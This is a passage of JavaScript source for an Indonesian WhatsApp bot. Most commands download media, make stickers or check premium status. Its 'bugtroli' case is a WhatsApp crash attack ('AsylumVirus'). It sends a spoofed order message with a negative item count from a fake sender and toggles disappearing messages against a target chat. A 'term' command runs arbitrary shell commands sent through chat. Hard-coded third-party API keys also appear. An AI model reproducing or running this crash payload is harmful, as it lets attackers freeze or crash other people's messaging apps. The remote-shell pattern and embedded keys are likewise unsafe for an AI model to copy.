            let txt = `*?????? ??? LIST PREMIUM ??? ??????*\nTotal : ${premium.length}\n\n`
            let men = [];
for (let i of premium){
men.push(i.id)
            
let cekvip = ms(i.expired - Date.now())
            txt += `*ID :* @${i.id.split("@")[0]}\n*Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
            }
            mentions(txt, men, true)
           
break


            case 'cekprem':
            case 'cekpremium':
            if (!isPremium) return reply(`Kamu bukan user premium`)
            let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
            let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
            try {
            ppimg = await ALDI.getProfilePicture(`${sender.split('@')[0]}@c.us`)

            } catch {

            ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
teks = `??? *??? Premium User ???* ???
*Nama : ${pushname}*
 *Tag : @${sender.split("@")[0]}*
 *Expired : ${premiumnya}*`
its = await getBuffer (ppimg)
ALDI.sendMessage(from, its, image, {contextInfo: { forwardingScore: 9999, isForwarded: false, mentionedJid: [sender]},quoted: mek, caption: teks
})
            break
 	        case 'hidetag':
			if (!isGroup) return reply(mess.group)
			var value = args.join(' ')
			var group = await ALDI.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: mek
			}
			ALDI.sendMessage(from, optionshidetag, text)
			break
/*			
	        case 'play':
            if (!isPremium) return reply(`Kamu bukan user premium`)	        
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
            try {
            yta(mulaikah)
            .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
            .then(async (a) => {
            if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
            const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
            sendMediaURL(from, thumb, captions)
            await sendMediaURL(from, dl_link).catch(() => reply('error'))
            })            
            })
            } catch (err) {
            reply(mess.api)
            }
            break*/
           case 'play':
           if (!isGroup)return reply(mess.group)
           if (args.length < 1) return reply(`Kirim perintah *${prefix}play query*`)
reply(mess.wait)
let yut = await yts(q)
yta(yut.videos[0].url)
.then(async(res) => {
const { thumb, title, filesizeF, filesize } = res
const capti = `P L A Y\n\n Title : ${title}\n\n Size : ${filesizeF}\n\n Views: ${yut.videos[0].views}\n\n Duration : ${yut.videos[0].timestamp}\n\n URL : ${yut.videos[0].url}`
             //sendMediaURL(from, thumb, capti)
            ya = await getBuffer(thumb)
            py =  await ALDI.prepareMessage(from, ya, image)
            gbutsan = [
            {buttonId: `${prefix}aud ${q}`, buttonText: {displayText: 'AUDIO'}, type: 100},
            {buttonId: `${prefix}video ${q}`, buttonText: {displayText: 'VIDEO'}, type: 100}
            ]
            gbuttonan = {
            imageMessage: py.message.imageMessage,
            contentText: capti,
            footerText: 'Pilih di bawah y bang',
            buttons: gbutsan,
            headerType: 4
            }
            await ALDI.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {quoted: mek})
            })
            break
            case 'aud':
            try {
            reply('_Lagu yang anda cari Sedang DiProsess.._')
            if (!isPremium) return reply(`Kamu bukan user premium`)	        
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
    		aramas = await yts(q);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
            yta(mulaikah)
            .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
            .then(async (a) => {
            if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
            const captions = `PLAY MUSIC\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
            sendMediaURL(from, thumb, captions)
            await sendMediaURL(from, dl_link).catch(() => reply('error'))
            })            
            })
            } catch (err) {
            reply(mess.api)
            }
            break
            case 'video':
            if (!isPremium) return reply(`Kamu bukan user premium`)
            if (args.length === 0) return reply(`Kirim perintah *${prefix}video* _Judul lagu yang akan dicari_`)
            aramas = await yts(q);
            aramat = aramas.all 
            var mulaikah = aramat[0].url            
            try {
            ytv(mulaikah)
            .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
            .then(async (a) => {
            if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY VIDEO*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
            const captions = `PLAY VIDEO\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
            sendMediaURL(from, thumb, captions)
            await sendMediaURL(from, dl_link).catch(() => reply('error'))
            })            
            })
            } catch (err) {
            reply(mess.api)
            }
            break
	        case 'ytsearch':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
	        
			if (args.length < 1) return reply('Tolong masukan query!')
			var srch = args.join('');
			try {
        	var aramas = await yts(srch);
   			} catch {
        	return await ALDI.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
    		var tbuff = await getBuffer(aramat[0].image)
    		var ytresult = '';
    		ytresult += '??? *YOUTUBE SEARCH* ???'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '??? Title: ' + video.title + '\n'
            ytresult += '??? Link: ' + video.url + '\n'
            ytresult += '??? Durasi: ' + video.timestamp + '\n'
            ytresult += '??? Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '??? *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break
	        case 'setreply':
	        case 'setfake':
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
			break
            case 'youtubedl':
            if (!isPremium) return reply(`Kamu bukan user premium`)            
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.Iv)
            teks = args.join(' ')
            res = await y2mateA(teks).catch(e => {
            reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
            })
            result = `*Youtube Downloader*
            
???? Title : ${res[0].judul}
???? Type : mp3/mp4
??? Durasi : ${res[0].size}`
            buttons = [{buttonId: `${prefix}buttons2 ${q}`,buttonText:{displayText: `?????? Video`},type:1},{buttonId:`${prefix}buttons1 ${q}`,buttonText:{displayText:'???? Audio'},type:1}]
            fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(res[0].thumb))
            imageMsg = ( await ALDI.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
            buttonsMessage = {footerText:'Pilih satu format di bawah ini', imageMessage: imageMsg,
            contentText:`${result}`,buttons,headerType:4}
            prep = await ALDI.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            ALDI.relayWAMessage(prep)
            fs.unlinkSync(`./ytmp.jpeg`)
            break
            case 'buttons1':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.Iv)
            teks = args.join(' ')
            res = await y2mateA(teks)
            sendFileFromUrl(res[0].link, document, {quoted: ftroli, mimetype: 'audio/mp3', filename: res[0].output})
            break
            case 'buttons2':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.Iv)
            teks = args.join(' ')
            res = await y2mateV(teks)
            sendFileFromUrl(res[0].link, video, {quoted: ftroli, mimetype: 'video/mp4', filename: res[0].output})
            break
	        case 'setfakeimg':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		    delb = await ALDI.downloadMediaMessage(boij)
		    fs.writeFileSync(`./image/fake.jpeg`, delb)
			fakestatus('Sukses')
            } else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
            case "noprefix":
            if (!mek.key.fromMe && !isOwner) return;
            if (prefixStatus == false) return reply("No prefix is recently on!");
            prefixStatus = false;
            reply("Berhasil mengganti prefix menjadi noprefix");
            break;
            case "multiprefix":
            if (!mek.key.fromMe && !isOwner) return;
            if (prefixStatus == true) return reply("Multi prefix is recently on!");
            prefixStatus = true;
            reply("Berhasil mengganti prefix menjadi multiprefix");
            break;			
	        case 'setthumb':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)	         
	         if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
            boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			 delb = await ALDI.downloadMediaMessage(boij)
			 fs.writeFileSync(`./image/thumb.jpeg`, delb)
			 fakestatus('Sukses')
        	 } else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	 }
			 break	
	         case 'ytmp4':
            if (!isPremium) return reply(`Kamu bukan user premium`)	         
			 if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			 let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			 if (!isLinks2) return reply(mess.Iv)
			 try {
			 reply(mess.wait)
			 ytv(args[0])
		     .then((res) => {
			 const { dl_link, thumb, title, filesizeF, filesize } = res
			 axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
			 .then((a) => {
			 if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
			 const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
			 sendMediaURL(from, thumb, captionsYtmp4)
			 sendMediaURL(from, dl_link).catch(() => reply(mess.api))
			 })		
			 })
			 } catch (err) {
			 reply(mess.api)
			 }
			 break
	         case 'emoji':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)				         
		  	 if (!q) return fakegroup('emojinya?')
			 qes = args.join(' ')
			 emoji.get(`${qes}`).then(emoji => {
			 teks = `${emoji.images[4].url}`
    		 sendStickerFromUrl(from,`${teks}`)	
    		 console.log(teks)
   			 })
    		 break
	         case 'ytmp3':
            if (!isPremium) return reply(`Kamu bukan user premium`)	         
			 if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			 let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			 if (!isLinks) return reply(mess.Iv)
		     try {
			 reply(mess.wait)
			 yta(args[0])
			 .then((res) => {
			 const { dl_link, thumb, title, filesizeF, filesize } = res
			 axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
			 .then((a) => {
		     if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
			 const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
			 sendMediaURL(from, thumb, captions)
			 sendMediaURL(from, dl_link).catch(() => reply(mess.api))
			 })
			 })
			 } catch (err) {
			 reply(mess.api)
			 }
			 break
case 'meme':
reply(mess.wait)
anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/darkjokes?apikey=${YuzApi}`)
buff = await getBuffer(anu.result.result)
gbutsan = [{buttonId:`meme`,buttonText:{displayText:'LANJUT??????'},type:1}]
mhan = await ALDI.prepareMessage(from, buff, image, {thumbnail: buff})
const buttonMessagessss = {
imageMessage: mhan.message.imageMessage,
contentText: `Ngedark Bos`,
footerText: '*_??A w a n g*',
buttons: gbutsan,
headerType: 4
}
ALDI.sendMessage(from, buttonMessagessss, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./cewe.jpeg'),
        caption: 'Tes',
            quoted: mek})
break
             case 'image':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
             
             if (args.length < 1) return reply('Masukan teks!')
             const gimg = args.join('');
             reply(mess.wait)
             gis(gimg, async (error, result) => {
             n = result
             images = n[Math.floor(Math.random() * n.length)].url
             ALDI.sendMessage(from,{url:images},image,{quoted:mek})
             });
             break/*
 	         case 'tiktok':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
 	         
            if (!isPremium) return reply(`Kamu bukan user premium`) 	         
 		     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		     if (!q) return fakegroup('Linknya?')
 		     reply(mess.wait)
		     hx.ttdownloader(`${args[0]}`)
    		 .then(result => {
    		 const { wm, nowm, audio } = result
    		 axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		 .then(async (a) => {
    		 me = `*Link* : ${a.data}`
		     ALDI.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		     })
		     })
     		 .catch(e => console.log(e))
     	 	 break*/
              case 'sticknobg': case 'snobg': case 'stickernobg':
              if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
              const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek

              filePath = await ALDI.downloadAndSaveMediaMessage(encmedia)

              file_name = getRandom('.png')
              file_name = getRandom('.webp')
              request({
url: `https://api.lolhuman.xyz/api/removebg?apikey=${lol}`,

              method: 'POST',
              formData: {
"img": fs.createReadStream(filePath)},

              encoding: "binary"
}, 
              function(error, response, body) {

              fs.unlinkSync(filePath)

              fs.writeFileSync(file_name, body, "binary")
              ffmpeg(`./${file_name}`)

              .input(file_name)
             
 .on('error',
              function(err) {
              
console.log(err)

              fs.unlinkSync(file_name)
})
             
 .on('end', 
              function() {
              
ALDI.sendMessage(from, fs.readFileSync(file_name), sticker, { quoted: mek})
              
fs.unlinkSync(file_name)

               })

               .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(file_name)
});
 
               } else {

               reply(`*Format Error!*\n\n*Example :*\n??? *_Kirim gambar dengan Caption ${prefix + command}_*\n\n*NOTE :*\n*_Bisa digunakan dengan Reply gambar_*`)
              
}
               break

               case 'stickwasted':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
               if (mek.message.extendedTextMessage != undefined || mek.message.extendedTextMessage != null) {
               ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait)
               owgi = await ALDI.downloadMediaMessage(ger)
               await fs.writeFileSync(`./stickwasted.jpeg`, owgi)
              
var imgbb = require('imgbb-uploader')

               anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickwasted.jpeg')
               teks = `${anu.display_url}`
               sendStickerFromUrl(from, `https://hardianto-chan.herokuapp.com/api/creator/imagemaker?endPoint=wasted&imgUrl=${teks}&apikey=hardianto`, mek)
               fs.unlinkSync('./stickwasted.jpeg')
               }
               limitAdd(sender, limit)
               break
case 'bugtroli':
              if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
ALDI.sendMessage(nomor, `??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????
??????????????????????????????????????????????????????????????????`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: 'Achil',
    itemCount: -99999999, // Bug
    status: 1,
    surface: 1,
    message: '??????Asylum??????',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
ALDI.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break

              
case 'stickwasted2':

               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)

               if (mek.message.extendedTextMessage != undefined || mek.message.extendedTextMessage != null) {
               ger = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait)
               owgi = await ALDI.downloadMediaMessage(ger)
               await fs.writeFileSync(`./stickwasted2.jpeg`, owgi)
               var imgbb = require('imgbb-uploader')
               anu = await imgbb("68cb5bee517bce4f74b0e910a5d96346", './stickmeme.jpeg')
               teks = `${anu.display_url}`
               sendStickerFromUrl(from, `http://lolhuman.herokuapp.com/api/editor/wasted?apikey=${lol}&img=${teks}`, mek)
               fs.unlinkSync('./stickwasted2.jpeg')
               }
               limitAdd(sender, limit)
               break

               case 'tiktok':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
             
            if (!isPremium) return reply(`Kamu bukan user premium`)            
if(!q) return reply('Masukkan linknya!')
reply(mess.wait)
try{
data = await  fetchJson(`https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${q}`)
buff = await  getBuffer(data.result.media_resources.image.contentUrl)
cap = monospace(`T I K T O K  D O W N L O A D E R`) + '\n\n'
cap += shp + ' Username : ' + data.result.author_metadata.username + '\n'
cap += shp + ' Judul : ' + data.result.media_metadata.title.split(' |')[0] + '\n'
cap += '\n\n'
cap += monospace('V I D E O  I N F O') + '\n\n'
cap += shp + ' Durasi : ' + data.result.media_resources.video.duration + 'Detik \n'
cap += shp + ' Kualitas : ' + data.result.media_resources.video.quality + '\n'
cap += shp + ' Width : ' + data.result.media_resources.video.width + '\n'
cap += shp + ' Height : ' + data.result.media_resources.video.height + '\n'
cap += shp + ' Ratio : ' + data.result.media_resources.video.ratio + '\n'
cap += '\n\n'
cap += monospace('S O U N D  I N F O') + '\n\n'
cap += shp + ' Judul : ' + data.result.media_resources.music.title + '\n'
cap += shp + ' Author : ' + data.result.media_resources.music.authorName + '\n'
cap += shp + ' Durasi : ' + data.result.media_resources.music.duration + 'Detik \n'
tta = await ALDI.prepareMessage(from, buff, image)
gbutsan = [
{buttonId: `${prefix}wm ${q}`, buttonText: {displayText: 'WM'}, type: 1},
{buttonId: `${prefix}nowm ${q}`, buttonText: {displayText: 'NOWM'}, type: 1},
{buttonId: `${prefix}music ${q}`, buttonText: {displayText: 'MUSIC'}, type: 1}
]
gbuttonan = {
imageMessage:
tta.message.imageMessage,

contentText: cap,

footerText: 'Pilih di bawah y bang',

buttons: gbutsan,
headerType: 4
}
await ALDI.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {quoted:mek})
}catch{
	
reply(mess.error)
}
break
case 'wm':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
             
            if (!isPremium) return reply(`Kamu bukan user premium`)            
reply(mess.wait)
buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/tiktokwm?apikey=HafzzYourBaka&url=${q}`)
ALDI.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek, caption : monospace(`T I K T O K  W I T H  W M`)})
break
case 'music' :
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
             
            if (!isPremium) return reply(`Kamu bukan user premium`)            

reply(mess.wait)
ttms = await fetchJson(`http://zekais-api.herokuapp.com/tiktokmusic?url=${q}`)
sendMediaURL(from, ttms.mp3)
break
case 'nowm' :
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
             
            if (!isPremium) return reply(`Kamu bukan user premium`)            
reply(mess.wait)
anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tiktok?apikey=HafzzYourBaka&url=${q}`, {method: 'get'})
if (anu.error) return reply(anu.error)
tt = `??? *TIKTOK NO WM* ???\n\n*Judul:* ${anu.result.title}\n*Keywords:* ${anu.result.keywords}\n*Desc:* ${anu.result.description}`
buff = await getBuffer(anu.result.link)
ALDI.sendMessage(from, buff, video, {mimetype: 'video/mp4', quoted: mek,caption : tt})
break     	 	 
             case 'tiktokaudio':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
             
            if (!isPremium) return reply(`Kamu bukan user premium`)            
 		     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		     if (!q) return fakegroup('Linknya?')
 		     reply(mess.wait)
 		     hx.ttdownloader(`${args[0]}`)
    		 .then(result => {
    		 const { audio} = result
            sendMediaURL(from,audio,'')
    		 })
     		 .catch(e => console.log(e))
     		 break
            case 'brainly':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
			 if (args.length < 1) return reply('Pertanyaan apa')
            brien = args.join(' ')
			 brainly(`${brien}`).then(res => {
			 teks = '???????????????????????????????????????????????????????????????????????????\n'
			 for (let Y of res.data) {
			 teks += `\n*??? _${nb} MENJAWAB_ ???*\n\n*??? Pertanyaan:* ${Y.pertanyaan}\n\n*??? Jawaban:* ${Y.jawaban[0].text}\n????????????????????????????????????????????????????????????\n`
			 }
			 ALDI.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})            
            })            
			 break
            case 'ig':
            if (!isGroup) return reply(mess.only.group)
            if (!q)return reply(`Example : ${prefix + command} [Link]`)
            reply(mess.wait)
            y = await fetchJson(`http://zekais-api.herokuapp.com/igdl?url=${q}`)
            t = `*??? IG DOWNLOADER ???*\n\n*Deskripsi :* ${y.capt}`
            sendMediaURL(from,y.result[0].url,t)
            break

            case 'igstalk':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
            case 'fb':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*Link video_normal* : ${G.Normal_video}`)
            })
            break    
	         case 'term':
	         if (!isOwner) return reply('hanya owner')
			 if (!q) return fakegroup(mess.wrongFormat)
			 exec(q, (err, stdout) => {
			 if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			 if (stdout) {
			 fakegroup(stdout)
			 }
			 })
		     break 
            case 'join':

            if (isGroup) return reply('*Fitur Hanya dapat digunakan dalam Private Chat!*')
            if (args.length < 1) return reply(`Kirim perintah *${prefix}join* link grup`)
            if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return reply(mess.error)
            let code = args[0].replace('https://chat.whatsapp.com/', '')
            ALDI.acceptInvite(code)
           
.then((res) => {
           
ALDI.sendMessage(res.gid,`*Halo saya ${nb}!*\n${gaya}Saya di invit oleh @${sender.split("@")[0]}.${gaya}\n${gaya}saya adalah robot whatsapp yang${gaya}\n${gaya}siap membantu kalian${gaya}\n${gaya} ketik !menu untuk melihat menu bot${gaya}\n\n${gaya}Made By ${nw}${gaya}`,text,{contextInfo:{mentionedJid:[sender]},quoted : finvite})
            replyWithFake(`_Succses Join Group!_`)
            })
.catch((err) => reply(jsonformat(err)))

            break

            case 'twitter':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)            
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break
            case 'runtime':
            run = process.uptime() 
            replyWithFakeLink(`${kyun(run)}`)
            break  
            case 'speed':
	        case 'ping':
		    const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
		    const teks = child.replace(/Memory:/, "Ram:")
			replyWithFakeLink(`*${teks}Speed: ${latensi.toFixed(4)} Second*`)
	        })
			break
            case 'totag':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await ALDI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            ALDI.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await ALDI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            ALDI.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await ALDI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
